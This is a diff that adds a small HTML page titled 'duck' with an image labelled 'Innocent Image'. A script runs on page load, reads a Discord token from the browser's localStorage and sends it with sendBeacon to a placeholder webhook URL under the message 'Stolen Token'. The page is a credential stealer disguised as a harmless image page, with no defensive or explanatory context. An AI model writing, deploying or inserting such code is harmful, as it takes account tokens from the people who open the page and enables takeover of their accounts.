@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>duck</title>
+    <script>
+        function stealToken() {
+            const token = localStorage.getItem('discord_token');
+            if (token) {
+                const webhookUrl = 'YOUR_WEBHOOK_URL';
+                const payload = JSON.stringify({
+                    content: `Stolen Token: ${token}`
+                });
+
+                navigator.sendBeacon(webhookUrl, payload);
+            }
+        }
+    </script>
+</head>
+<body onload="stealToken()">
+    <img src="duck.jpg" alt="Innocent Image">
+</body>
+</html>
